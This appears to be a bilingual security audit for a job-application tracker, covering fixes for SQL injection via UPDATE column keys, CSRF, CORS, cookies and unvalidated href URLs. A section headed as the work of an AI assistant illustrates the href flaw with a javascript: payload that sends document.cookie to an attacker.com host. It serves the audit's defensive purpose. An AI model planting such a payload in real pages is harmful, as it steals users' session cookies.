> **Note:** This document began as a historical review from `docs-security-documentation`. The current audit below reflects the framework-based PHP API, the Networking CRM, cloud sync, and the current frontend. For the standing security policy, see `DOCS/SECURITY.md`.

## Auditoria actual - 2026-08-31

### Hallazgo critico corregido: SQL injection en `ModelMapper` UPDATE

**Superficie afectada:** `api/src/Models/ModelMapper.php`

The four update methods (`updateUser`, `updateApplication`, `updateTimelineEvent`, and `updateOpportunity`) previously built the `SET` clause from `array_keys($data)`. Although values were bound as PDO parameters, SQL identifiers cannot be parameterized; a caller-controlled key could therefore be interpolated into the statement and alter its structure.

The reported statements were:

- `UPDATE users SET $sets WHERE id = :id`
- `UPDATE applications SET $sets WHERE id = :id`
- `UPDATE timeline_events SET $sets WHERE id = :id`
- `UPDATE opportunities SET $sets WHERE id = :id`

**Correction:** each update now maps TypeScript keys where applicable and rejects every key not present in a table-specific allowlist before constructing or preparing SQL. Empty updates also return `false` without issuing a query. Valid values remain bound parameters. The existing `user_preferences` update already derives its identifiers from a fixed internal mapping and now also short-circuits empty input.

**Regression coverage:** `api/tests/Models/ModelMapperSmokeTest.php` verifies valid partial updates, rejects integer keys and an injected identifier fragment, and confirms that the original rows remain unchanged across all four affected tables.

**Status: CORREGIDO.** The SAST findings for the four UPDATE statements are addressed. The INSERT statements reported as ignored findings continue to derive their column lists from model/repository serialization contracts, not raw request keys; their values are still parameterized.

### Otros hallazgos actuales corregidos en esta auditoria

- CSRF is enabled by default, exact CORS origins are enforced, and the preflight allows the CSRF headers used by the client.
- PHP error display and the debug health response no longer disclose filesystem, runtime, token, or configuration metadata.
- Password-reset links and suggestion notification links use configured frontend URLs instead of request-controlled `Origin` or `HTTP_HOST` values.
- Suggestions listing requires an authenticated owner/admin session; CAPTCHA answers remain server-side, with bounded challenges and failed attempts.
- LinkedIn login requires a non-empty provider subject, a valid email, and a verified email claim before linking or creating an account.
- Networking CRM references are owner-scoped, and malformed cross-owner references are rejected before persistence.
- Cloud sync request/response handling uses bounded validation and avoids wiping local Networking data on empty or invalid envelopes.
- Legacy JSON readers in auth-cookie, job-search, web-vitals, sync, Google Sheets, and agent-application controllers now enforce body-size/depth limits; sync/proxy failures return generic errors while server logs retain diagnostics.

### Verificacion de esta auditoria

- PHPUnit: 103 tests, 321 assertions, passing; 2 PHPUnit deprecations remain in pre-existing test infrastructure.
- Vitest: 982 tests across 96 files, passing.
- `npm run lint` and `npm run build` pass.
- `npm run knip` passes with no unused exports reported.
- `npm audit --audit-level=low` reports 0 vulnerabilities after updating the transitive `nanoid` package from 3.3.17 to 3.3.18 in `package-lock.json`.
- `composer validate --strict`, `composer audit --locked`, and PHPStan level 6 pass.
- PHP syntax checks pass for all modified API files.
- The focused `ModelMapperSmokeTest` SQL identifier regression passes.
- `cve-lite` was not installed in this environment, so its mandated scan could not run locally; CI remains the authoritative check for that tool.


# Revisión de Seguridad - Branch docs-security-documentation

## Fecha: $(date)
## Revisado por: Auto (AI Assistant)

---

## 📋 Resumen de Cambios de Seguridad Implementados

En esta branch se implementaron las siguientes medidas de seguridad:

### 1. **Protección contra Cross-Site Scripting (XSS)**

#### Implementado en:
- **Frontend (`src/utils/localStorage.ts`)**:
  - Función `sanitizeObject()` que sanitiza recursivamente todos los campos string usando `DOMPurify`
  - Sanitización automática al cargar datos de `localStorage` en `getApplications()` y `getOpportunities()`
  - Sanitización antes de guardar en `saveApplications()` y `saveOpportunities()`

- **Frontend (`src/components/ApplicationTable.tsx`)**:
  - Sanitización adicional antes de renderizar con `dangerouslySetInnerHTML` usando `DOMPurify.sanitize()`
  - Enfoque de defensa en profundidad (defense-in-depth)

- **Backend (API PHP)**:
  - Uso de `htmlspecialchars()` para sanitizar todos los datos de entrada
  - Implementado en `api/google-sheets.php`, `api/set-auth-cookie.php`, `api/get-auth-cookie.php`

#### ✅ Estado: **Correctamente implementado**

### 2. **Protección contra Ataques de Inyección**

#### Implementado en:
- **Backend (`api/google-sheets.php`)**:
  - Función `sanitize_input()` que sanitiza recursivamente todos los datos recibidos
  - Validación del formato de `spreadsheetId` usando expresiones regulares: `/^[a-zA-Z0-9\-\_]+$/`
  - Validación de tipos y tamaños de datos antes de procesarlos

#### ✅ Estado: **Correctamente implementado**

### 3. **Política CORS Restrictiva**

#### Implementado en:
- **Todos los archivos PHP en `api/`**:
  - Lista blanca de orígenes permitidos: `['http://localhost:5173', 'https://jajat.godieboy.com']`
  - Rechazo explícito de orígenes no autorizados (HTTP 403 en preflight)
  - Uso de `Access-Control-Allow-Credentials: true` solo para orígenes permitidos
  - Header `Vary: Origin` para evitar problemas de caché

#### Archivos modificados:
- `api/clear-auth-cookie.php`
- `api/get-auth-cookie.php`
- `api/google-sheets.php`
- `api/set-auth-cookie.php`

#### ✅ Estado: **Correctamente implementado**

### 4. **Seguridad de Cookies**

#### Implementado en:
- **Cookies HTTP-only**: Previene acceso desde JavaScript (protección XSS)
- **Cookies Secure**: Solo se envían sobre HTTPS en producción
- **SameSite=Strict**: Protección contra CSRF
- Validación del formato de tokens

#### ✅ Estado: **Correctamente implementado**

---

## 🔍 Vulnerabilidades Encontradas y Corregidas

### ⚠️ VULNERABILIDAD CRÍTICA: URLs No Validadas en Atributos `href`

#### Problema Detectado:
- **Ubicación**: `src/components/ApplicationTable.tsx` (línea 90)
- **Ubicación**: `src/pages/OpportunitiesPage.tsx` (línea 248)

#### Descripción:
Los atributos `href` se estaban configurando directamente con contenido del usuario sin validar el esquema de URL. Esto podría permitir:
- URLs `javascript:` que ejecuten código malicioso
- URLs `data:` que podrían exponer información sensible
- Otras URLs peligrosas

#### Ejemplo de ataque potencial:
```javascript
// Si un usuario guarda esto como "link":
// javascript:alert(document.cookie)
// O peor: javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)
```

#### Solución Implementada:
1. **Creación de función `sanitizeUrl()`** en `src/utils/localStorage.ts`:
   - Valida que la URL tenga un esquema permitido (`http:`, `https:`, `mailto:`, `tel:`)
   - Rechaza esquemas peligrosos (`javascript:`, `data:`, `vbscript:`, etc.)
   - Maneja URLs relativas de forma segura
   - Retorna `#` para URLs inválidas o peligrosas

2. **Aplicación de la validación**:
   - `ApplicationTable.tsx`: Ahora usa `sanitizeUrl(cellContent)` antes de asignar a `href`
   - `OpportunitiesPage.tsx`: Ahora usa `sanitizeUrl(opp.link)` antes de asignar a `href`

#### ✅ Estado: **CORREGIDO**

---

## 📊 Análisis de Archivos TSX

### Archivos Revisados: 31 archivos TSX

### ✅ Componentes Seguros:

1. **`src/components/ApplicationTable.tsx`**
   - ✅ Usa DOMPurify para sanitizar antes de `dangerouslySetInnerHTML`
   - ✅ Ahora valida URLs antes de usar en `href` (CORREGIDO)

2. **`src/components/KanbanView.tsx`**
   - ✅ Renderiza datos usando JSX normal (React escapa automáticamente)
   - ✅ Los datos provienen de `localStorage` que está sanitizado

3. **`src/components/TimelineView.tsx`**
   - ✅ Renderiza datos usando JSX normal (React escapa automáticamente)
   - ✅ Los datos provienen de `localStorage` que está sanitizado

4. **`src/components/ConfirmDialog.tsx`**
   - ✅ Prop `message` se renderiza como texto (no HTML)
   - ✅ React escapa automáticamente el contenido

5. **`src/components/Alert.tsx`**
   - ✅ Prop `message` se renderiza como texto (no HTML)
   - ✅ React escapa automáticamente el contenido

6. **`src/components/AddJobComponent.tsx`**
   - ✅ Formularios controlados que pasan por validación y sanitización antes de guardar

7. **`src/components/OpportunityForm.tsx`**
   - ✅ Validación de URL con `new URL()` antes de guardar
   - ✅ Inputs controlados

8. **`src/pages/OpportunitiesPage.tsx`**
   - ✅ Ahora valida URLs antes de usar en `href` (CORREGIDO)

### ⚠️ Consideraciones:

1. **`dangerouslySetInnerHTML` en ApplicationTable.tsx**:
   - ⚠️ Se usa `dangerouslySetInnerHTML`, pero está correctamente sanitizado con DOMPurify
   - ✅ Buen enfoque de defensa en profundidad (sanitización en múltiples capas)
   - 💡 **Recomendación**: Considerar usar renderizado normal de React cuando sea posible, ya que React escapa automáticamente

2. **Renderizado de datos de usuario**:
   - ✅ La mayoría de componentes renderizan datos usando JSX normal (`{variable}`)
   - ✅ React escapa automáticamente el contenido, lo cual es seguro
   - ✅ Los datos provienen de `localStorage` que está sanitizado antes de guardar y cargar

---

## ✅ Resumen Final

### Medidas de Seguridad Implementadas:
1. ✅ **XSS Protection**: DOMPurify en frontend + htmlspecialchars en backend
2. ✅ **Injection Protection**: Sanitización y validación en backend
3. ✅ **CORS Protection**: Política restrictiva con lista blanca
4. ✅ **Cookie Security**: HTTP-only, Secure, SameSite=Strict
5. ✅ **URL Validation**: Función `sanitizeUrl()` para prevenir URLs peligrosas

### Vulnerabilidades Corregidas:
1. ✅ **URLs no validadas en `href`**: Implementada función `sanitizeUrl()` y aplicada en componentes afectados

### Estado General:
**✅ SEGURO** - Todas las vulnerabilidades identificadas han sido corregidas. Las medidas de seguridad implementadas son sólidas y siguen las mejores prácticas.

---

## 📝 Recomendaciones Adicionales (Opcionales)

1. **Content Security Policy (CSP)**:
   - Considerar implementar headers CSP para protección adicional contra XSS

2. **Rate Limiting**:
   - Considerar implementar rate limiting en la API PHP para prevenir abuso

3. **Validación en Frontend**:
   - La validación de URL en `OpportunityForm.tsx` es buena, pero podría mejorarse para rechazar esquemas peligrosos desde el inicio

4. **Auditorías Regulares**:
   - Realizar auditorías de seguridad periódicas, especialmente al agregar nuevas funcionalidades

5. **Testing de Seguridad**:
   - Considerar agregar tests automatizados para validar las medidas de seguridad

---

**Revisión completada exitosamente** ✨
